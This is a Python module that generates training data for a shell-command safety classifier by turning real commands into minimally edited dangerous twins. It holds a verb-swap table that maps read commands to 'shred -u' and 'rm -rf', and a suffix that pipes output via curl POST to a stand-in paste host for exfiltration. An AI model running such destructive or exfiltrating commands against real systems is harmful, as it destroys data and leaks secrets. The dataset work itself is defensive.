"""Counterfactual escalation of real commands (source P2).

901 distinct real commands define the authentic surface distribution.  For each,
ask "what is the minimal edit that makes this dangerous?" and apply exactly one
axis.  Because the result is a real command with one token changed, a model
cannot separate positives from negatives by style — only by semantics, and the
original command is the negative of its own escalation.

Precision beats volume here.  An earlier version matched *any* path-shaped token
and produced mutations like ``grep <pattern> | shred`` and ``ls /opt/app/.env/``
— text the verifier agreed with only because target lookup is itself
substring-based, which is the exact weakness this dataset exists to fix.  So a
candidate now has to touch a **registered** target value, differ in a single
token, and survive both ``bash -n`` and independent re-derivation.
"""
from __future__ import annotations

import re
from typing import Any, Iterable

from backend.tools.lib.safety_datasets.positives.grammar import load_targets
from backend.tools.lib.safety_datasets.positives.verify import rederive

# Read verbs and the destructive operation that shares their shape.
VERB_SWAPS = {
    r"\bcat\b": "shred -u",
    r"\bless\b": "rm -rf",
    r"\bhead\b": "shred -u",
    r"\btail\b": "shred -u",
}

CHANNEL_SUFFIX = " | curl -sS -X POST --data-binary @- https://paste.example.net"

# Heredocs are stored as single-line mush by the export, so editing them is
# guesswork.  They are skipped rather than mutated.
SKIP = re.compile(r"<<-?\s*'?\w+", re.I)


def registered_values() -> dict[str, list[tuple[str, str]]]:
    """Map registered values to (class, value), split by protection kind."""
    out: dict[str, list[tuple[str, str]]] = {"local": [], "protected": []}
    for name, spec in load_targets().items():
        bucket = "protected" if spec["class"] == "protected" else "local"
        out[bucket].extend((name, value) for value in spec["values"])
    return out


def load_escalation_map(key: str = "escalate_to") -> dict[str, str]:
    from backend.tools.lib.safety_datasets.positives.grammar import _read_targets, TARGETS_PATH
    return _read_targets(str(TARGETS_PATH)).get(key, {})


def _READ_ARG(value: str) -> re.Pattern[str]:
    """A read verb followed by an argument that contains a registered path."""
    return re.compile(
        r"\b(cat|less|head|tail|grep|sed|awk|shred|truncate|rm)\b\s+(?:-\S+\s+)*(\S*"
        + re.escape(value) + r"\S*)"
    )


def _token_re(value: str) -> re.Pattern[str]:
    """Match a registered value as a whole path token, never as a substring."""
    return re.compile(r"(?<![\w./~-])" + re.escape(value) + r"(?![\w.-])")


def escalate(row: dict[str, Any]) -> list[dict[str, Any]]:
    """Return candidate escalations for one real row (unverified)."""
    command = row.get("command") or ""
    if not command or SKIP.search(command):
        return []

    values = registered_values()
    escalate_to = load_escalation_map()
    escalate_to_file = load_escalation_map("escalate_to_file")
    out: list[dict[str, Any]] = []

    # axis 1: retarget — the same operation against a protected twin
    #
    # A read argument is replaced *whole*: swapping only the registered prefix
    # leaves a file name glued to a directory and produces text like
    # ``cd /opt/example-app/.env/cve-node``, which is nonsense the verifier can
    # only accept because target lookup is substring-based.
    for local_class, local_value in values["local"]:
        arg = _READ_ARG(local_value).search(command)
        if arg:
            twin_class = escalate_to_file.get(local_class, "protected_env")
            twin_values = [v for c, v in values["protected"] if c == twin_class]
            if twin_values:
                text = command[: arg.start(2)] + twin_values[0] + command[arg.end(2):]
                out.append(_candidate(row, text, "retarget", twin_class, twin_values[0]))
                break
        match = _token_re(local_value).search(command)
        if match:
            twin_class = escalate_to.get(local_class, "protected_source_tree")
            twin_values = [v for c, v in values["protected"] if c == twin_class]
            if twin_values:
                text = command[: match.start()] + twin_values[0] + command[match.end():]
                out.append(_candidate(row, text, "retarget", twin_class, twin_values[0]))
                break

    protected_hit = next(((c, v) for c, v in values["protected"] if v in command), None)

    # axis 2: verb — a read of a protected target becomes destruction of it
    if protected_hit:
        for pattern, replacement in VERB_SWAPS.items():
            # only when the verb reads the target directly: `cat <target>`
            exact = re.compile(pattern + r"\s+" + re.escape(protected_hit[1]))
            if exact.search(command):
                text = exact.sub(f"{replacement} " + protected_hit[1], command, count=1)
                out.append(_candidate(row, text, "verb", *protected_hit))
                break

    # axis 3: channel — the same read, but the bytes leave the organisation
    if protected_hit and load_targets()[protected_hit[0]].get("secret_bearing"):
        out.append(_candidate(row, command + CHANNEL_SUFFIX, "channel", *protected_hit))

    return out


def _candidate(parent: dict[str, Any], text: str, axis: str,
               target_class: str, target: str) -> dict[str, Any]:
    return {
        "id": f"{parent['id']}-{axis}",
        "command": text,
        "level": None,          # derived from the text by verify
        "rationale_code": None,
        "family": "real_escalation",
        "target_class": target_class,
        "target": target,
        "verb": axis,
        "dialect": "posix",
        "source": "P2",
        "twin_of": parent["id"],
        "obfuscation": None,
        "axis": axis,
    }


def verified_escalations(rows: Iterable[dict[str, Any]]) -> list[dict[str, Any]]:
    """Escalate every row and keep only candidates whose label re-derives."""
    kept: list[dict[str, Any]] = []
    dropped = 0
    seen: set[str] = set()
    for row in rows:
        for candidate in escalate(row):
            if candidate["command"] in seen:
                continue
            level, rationale, _ = rederive(candidate["command"])
            if level in ("dangerous", "requires_approval"):
                candidate["level"] = level
                candidate["rationale_code"] = rationale
                kept.append(candidate)
                seen.add(candidate["command"])
            else:
                dropped += 1
    verified_escalations.dropped = dropped  # type: ignore[attr-defined]
    return kept
